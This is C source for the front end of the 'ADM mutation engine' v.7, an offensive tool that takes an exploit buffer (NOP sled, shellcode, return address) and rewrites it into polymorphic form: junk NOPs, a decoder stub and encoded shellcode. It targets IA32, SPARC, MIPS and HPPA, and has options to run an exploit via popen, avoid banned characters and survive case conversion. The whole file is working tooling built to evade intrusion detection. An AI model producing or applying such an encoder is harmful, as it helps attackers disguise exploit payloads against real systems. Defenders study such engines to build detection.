/*
   K2,
   ADM mutation engine... v.7
   I'm going use a user defined mark to spec what I can use as my working
   space (usually 0x90).
   I coded this on Solaris where everything is cool... other unix's should
   work fine thuough.
   
   Compilation Instructions:
   there should be a make file :)
*/

#include <stdio.h>
#if defined(LINUX) || defined(OS5) || defined(TRU64) || defined(BSD)
#include <string.h>
#else
#include <strings.h>
#endif
#include <stdlib.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include "ADMmutapi.h"

char working[6];  /* = "\x90";  i use "working" as a name insted of NOPCODE cuz this is my working space */
char jumpz[6];    /* where to stop encoding (little endian), jumpz is the retoffset */
int  omodulate=0; /* offset modulation flag */
size_t sh_padding=0;

/* Try to disect a buffer in the standard form of [AAAA][BBBB][CCCC] A=nop,B=shellcode,C=ret address
   should generate a new bit of shellcode in the form of [JJJJ][DJDJD][EEEE][CCCC]
   J=junknops, D=decoder,E=encoded shellcode,C=return addy (possiably modified) */
int mutate(char *mutant, struct morphctl *mut)
{
   size_t   njlen,retadd,enc=0,tot;
   struct   morphctl *mctlp;
   char     *rets;

   mctlp = mut;
   if(init_mutate(mctlp) < 0) {
      fprintf(stderr," ERROR: cannot initialize mutate API\n");
      fprintf(stderr," ERROR: maby you selected more than 1 arch?\n");
      exit(4);
   }

#ifdef DEBUG
   fprintf(stderr,"JUMPZ = 0x%.2x%.2x%.2x%.2x\n",jumpz[0] & 0xff,jumpz[1]& 0xff,jumpz[2]& 0xff,jumpz[3]& 0xff);
   fprintf(stderr,"WORKING = 0x%.2x%.2x%.2x%.2x\n",working[0] & 0xff,working[1]& 0xff,working[2]& 0xff,working[3]& 0xff);
#endif   
   
   tot = strlen(mutant);
   if((rets = strstr(mutant,jumpz)) != NULL)
   {
      retadd = strlen(rets);
      njlen = (strspn(mutant,working));
      /* stupid bug */
      if(mut->arch == IA32)
         njlen--;

      /* well, HP dosnt seem to give us the same results as solaris/linux */
      if(mut->arch == HPPA) {
         njlen-=4;        
         enc+=12;
      }

      enc += tot-(njlen+retadd);
      enc += sh_padding;

#ifdef DEBUG
      fprintf(stderr,"enc = %d, tot = %d, njlen = %d, retadd = %d\n",enc,tot,njlen,retadd);
#endif
            
      if(apply_key(mutant, enc, njlen, mctlp) != 0) {
         fprintf(stderr,"\ncould not find a key that would produce code requested\n");
         fprintf(stderr,"try waiting a second or so to get new random sequence\n\n");
         exit(1);
      }
      if(apply_jnops(mutant, njlen, *mut) != 0) {
         fprintf(stderr,"\ncould not find any useable key's\n");
         fprintf(stderr,"apply_key should be called before this function\n\n");
      }
      if(apply_engine(mutant, enc, njlen, *mut) != 0) {
         fprintf(stderr,"\ncould not encode an engine within paramaters, (hardcoded target offsets probably screwed us)\n");
         fprintf(stderr,"try tuning the amount of JMAX in ADMmutapi.h\n");
         fprintf(stderr,"also, try waiting a second or so to get new random sequence\n\n");
         exit(1);
      }

       /* the 3'rd arg should point to the least significant byte in the ret addy */
      if(omodulate)
         apply_offset_mod(mutant,retadd,tot-retadd+2,*mut);

      return(0);
   }

   fprintf(stderr,"ERROR: the offset you specified was NOT FOUND!!!\n");
   exit(-1);
}

/* Takes a string input, convert's to base16 long, convert's to the correct
   byte ordering */
int lend(char *bigends, char *pend, struct morphctl mut)
{
   unsigned int x;
#if defined(HPUX) || defined(BSD) || defined(OS5) || defined(TRU64)
   x=strtoul(bigends, (char **)NULL, 16);
#else
   x=strtoll(bigends, (char **)NULL, 16);
#endif
#ifdef DEBUG
   fprintf(stderr,"target offset = 0x%x\n",x);
#endif   
   if(x < 0xff) {
      *pend++ = (x)&0xff;
      *pend++ = 0x00;
      return(0);
   }
   
   if(mut.arch == IA32) {
      *pend++ = (x>>16)&0xff;
      *pend++ = (x>>24)&0xff;
      *pend++ = (x)&0xff;
      *pend++ = (x>>8)&0xff;
      *pend++ = '\0';
   } else {
      *pend++ = (x>>24)&0xff;
      *pend++ = (x>>16)&0xff;   
      *pend++ = (x>>8)&0xff;
      *pend++ = (x)&0xff;
      *pend++ = '\0';
   }
   return(0);
}

int main(int argc, char **argv)
{
   char cmd[BUFSIZ];
   char banner[1<<8]; /* don't gimmie no bammer seed */
   char *vbuf=NULL,*bvbuf=NULL;
   extern char *optarg;
   size_t readz=0,pos=0,vbufsz;
   int  i,mmem=0,c,errflg=0,readpipe=0,cout=0,trunc=0;
   struct morphctl mut;
   FILE *ptr;
 
   mut.lower=0; mut.upper=0;
   mut.banned=0;
   
   if(argc > 1) {
      while ((c = getopt(argc, argv, "?UlIx:o:p:n:ucismht:B:")) != EOF)
         switch (c) {
            case 'B':
                  strncpy(banner,optarg,(1<<8-1));
                  mut.banned=banner;
                  break;
            case 'x':
                  strncpy(cmd,optarg,BUFSIZ);
                  readpipe++;
                  break;
            case 'o':
                  lend(optarg,jumpz,mut);
                  break;
            case 'c':
                  cout++;
                  break;
            case 'n':
                  lend(optarg,working,mut);
                  break;
            case 'p':
                  sh_padding+=strtol(optarg, (char **)NULL, 16);
                  break;
            case 'U':
                  mut.upper++;
                  break;
            case 's':
                  mut.arch = SPARC;
                  break;
            case 'I':
                  mut.arch = IA32_SLIDE;
                  break;
            case 'i':
                  mut.arch = IA32;
                  break;
            case 'm':
                  mut.arch = MIPS;
                  break;
            case 'h':
                  mut.arch = HPPA;
                  break;
            case 't':
#if defined(HPUX) || defined(BSD) || defined(OS5) || defined(TRU64)
                  trunc = strtoul(optarg, (char **)NULL, 16);
#else                  
                  trunc = strtoll(optarg, (char **)NULL, 16);
#endif
                  break;
            case 'l':
                  mut.lower++;
                  break;
            case 'u':
                  omodulate++;
                  break;
            case '?':
            default:
                  errflg++;
                  break;
         }
   } else {
      errflg++;
   }

   if(!jumpz[0] || !working[0] || !mut.arch)
      errflg++;

   if(errflg) {
      fprintf(stderr,"\nusage: %s  -i|s|m|h|I -o offset -n NOP [-x xploit] [-t ##] [-B string] [-U|l] [-u] [-c] [-p ##]\n",argv[0]);
      fprintf(stderr,"        NOP is 99%% of the time 0x90 (on IA32)\n");
      fprintf(stderr,"        offset is entered like \"0x42c0ffee\"\n");
      fprintf(stderr,"        -i (IA32), -s (SPARC), -m (MIPS), -h (HPPA), -I (IA32_SLIDE)\n");
      fprintf(stderr,"        -U/-l will produce toupper()/tolower() resistant shellcodes\n");
      fprintf(stderr,"        -B STRING, will place the string argument into the banned char list\n");
      fprintf(stderr,"        -c will output a C style array\n");
      fprintf(stderr,"        -t will truncate the output buffer by the specified amount\n");
      fprintf(stderr,"        -p will pad the encode/decode length (to avoid hardcoded values in engine, like jump offsets)\n");
      fprintf(stderr,"        -u will attempt to modulate the offset (can be dangerious!!!)\n\n");
      exit(2);
   }
   
   if(mut.arch < IA32) {
      fprintf(stderr,"you need to select at least one archatecture -i|-s|-h|-m|-S\n");
      fprintf(stderr,"and the arch has to be the first ARGUMENT!!!\n");
      exit(3);
   }

   if(!readpipe)
      ptr = stdin;
   else
      ptr = popen(cmd, "r");

   if(ptr != NULL)
   {
      vbuf = malloc((size_t) BUFSIZ);
      while((readz = fread(vbuf+(pos),sizeof(unsigned char),(size_t) BUFSIZ,ptr)) > 0) 
      {
         mmem++;
         pos+=readz;
         vbuf=realloc(vbuf,(size_t) ((mmem+1)*BUFSIZ));
      }
   }
   /* sometimes there is crap @ the end of the codez */
   if(trunc)
      vbuf[strlen(vbuf)-trunc] = 0x00;

   vbufsz = strlen(vbuf);
   bvbuf = malloc(vbufsz);
      
#ifdef DEBUG
   fprintf(stderr,"LEN=[%d] STR=[%s]\n",vbufsz,vbuf);
#endif
   /* to get around some ocassional truncation and brute for good key */
   do
   {
      memcpy(bvbuf,vbuf,vbufsz);
      mutate(bvbuf,&mut);
   } while((strlen(bvbuf)) < vbufsz);

#ifdef DEBUG
   fprintf(stderr,"LEN=[%d] STR=[%s]\n",strlen(bvbuf),bvbuf);
#endif

   /* play'n around, I cant believe my flight is delay so long */
   if(cout) {
      printf("\nARRAY [%d] = \n\"",strlen(bvbuf));
      for(i=0;i<strlen(bvbuf);i++) {
         printf("\\x%.2x",(*(bvbuf+i) & 0xff));
         if(((i+1)%16)==0)
            printf("\"\n\"");
      }
      printf("\"\n\n");
      return(0);
   }

   /* change between exec or printf for needs */
   //execl("./vulnerable","vulnerable",bvbuf,NULL);
   //fprintf(stderr,"execl failed!\n");
   printf("%s",bvbuf);
   exit(0); /* this can free 4 me :) */
}
